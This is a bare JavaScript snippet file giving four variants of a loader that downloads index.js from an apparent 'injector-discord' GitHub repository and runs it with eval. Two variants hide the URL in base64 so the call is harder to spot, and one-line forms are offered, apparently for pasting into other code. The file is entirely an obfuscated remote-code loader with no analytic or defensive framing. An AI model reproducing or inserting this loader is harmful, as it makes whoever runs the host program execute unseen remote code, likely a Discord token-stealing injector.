//default
require('https').get('https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js', (res) => { 
    var data = ""; 
    res.on('data', (dat) => data += dat.toString());
    res.on('end', () => eval(data))
})
//hidden
require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NhbXVlbE1ldS9pbmplY3Rvci1kaXNjb3JkL21haW4vaW5kZXguanM=', 'base64').toString(), (res) => { 
    var data = ""; 
    res.on('data', (dat) => data += dat.toString());
    res.on('end', () => eval(data));
})
//one line
require('https').get('https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js', (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
//one line + hidden
require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NhbXVlbE1ldS9pbmplY3Rvci1kaXNjb3JkL21haW4vaW5kZXguanM=', 'base64').toString(), (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
